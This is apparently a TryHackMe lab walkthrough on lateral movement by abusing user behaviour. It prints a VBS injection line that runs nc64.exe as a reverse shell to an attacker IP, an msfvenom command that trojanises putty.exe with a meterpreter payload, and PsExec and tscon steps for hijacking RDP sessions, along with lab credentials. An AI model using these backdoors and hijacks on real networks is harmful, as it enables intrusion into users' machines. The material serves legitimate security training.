# Abusing User Behaviour

It is quite common to find network shares that legitimate users use to perform day-to-day tasks when checking corporate environments. If those shares are writable for some reason, an attacker can plant specific files to force users into executing any arbitrary payload and gain access to their machines.

***

### <mark style="color:green;">Backdooring .vbs Scripts</mark>

For example, if the shared resource is a VBS script, we can put a copy of `nc64.exe` on the same share and inject the following code,&#x20;

```vbnet
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

***

### <mark style="color:green;">Backdooring .exe Files</mark>

If the shared file is a Windows binary like `putty.exe`, we can download it and inject a backdoor inside it.

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse\_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.

***

### <mark style="color:green;">RDP Hijacking</mark>

When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using `psexec` to do so. First, let's run a `cmd.exe` as administrator:

<figure><img src="../../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>

Run `PsExec64.exe`

```
PsExec64.exe -s cmd.exe
```

We can list existing sessions using `query`:

```
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
```

If we were currently connected via RDP using the administrator user, our SESSIONNAME would be `rdp-tcp#6` . There is also a user named 'luke' that has a session open with id `3` . Any sessions with a **disconnected (Disc.)** means the session has been left open and not being used.

If we took over his active session, the legitimate user will be forced out of it. To connect to the session we can use `tscon.exe`&#x20;

```
tscon 3 /dest:rdp-tcp#6
```

In simple terms, the command states that the graphical session `3` owned by luke, should be connected with the RDP session `rdp-tcp#6`, owned by the administrator user.

***

***

<figure><img src="../../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

## Task 4

Similar to the previous task, we need to hijack a users RDP session . Initial credentials are given (assume we captured with admin access). These credentials will give admin access to THMJMP2

User: t2\_charlie.holland

Password: Five2016

***

Login to the User through RDP

```bash
xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
```

<figure><img src="../../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>

Just repeat the steps above and we should be good. Here after running `psexec` we get SYSTEM privileges and ready to hijack

<figure><img src="../../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>

Query the users

<figure><img src="../../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

Connect to the session and attach the RDP session

```
tscon 4 /dest:rdp-tcp#25
```

We immediately get the flag

<figure><img src="../../../.gitbook/assets/image (622).png" alt=""><figcaption></figcaption></figure>

